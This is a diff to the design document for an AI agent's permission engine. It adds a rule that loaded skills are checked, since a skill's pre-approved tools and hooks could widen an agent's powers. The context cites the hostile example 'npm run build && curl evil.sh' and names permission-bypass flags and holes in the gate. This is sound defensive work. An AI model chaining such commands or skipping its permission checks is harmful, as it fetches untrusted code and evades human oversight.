@@ -1260,7 +1260,7 @@ are handed to the engine verbatim, because the engine splits a compound command
 on every shell separator and requires each part to match. A rule test written
 here would clear `npm run build && curl evil.sh`.
 
-Three consequences worth stating, because each was a hole:
+Four consequences worth stating, because each was a hole:
 
 - **Both bypasses must go.** `permissionMode: 'bypassPermissions'` and the
   `dangerously-skip-permissions` flag each skip the permission engine on their
@@ -1276,6 +1276,13 @@ Three consequences worth stating, because each was a hole:
   allow/deny lists and routes no call through `canUseTool`
   (`features.permissionRules`), so a restricted turn on it is refused outright
   rather than run with everything.
+- **What a skill brings is measured, not trusted.** A loaded skill's
+  `allowed-tools` join the auto-allow rules for the rest of the turn, its hooks
+  run commands, and the engine loads a skill with no pre-approvals without
+  reaching the gate at all. So a skill call is judged by a pre-tool hook as well
+  as the gate, and a skill whose pre-approvals reach past what the session
+  already settles does not load (`turn-skills.ts`; runtime DESIGN "Skills on a
+  borrowed turn").
 
 ### The owner's record (`team_tool_audit`)
 
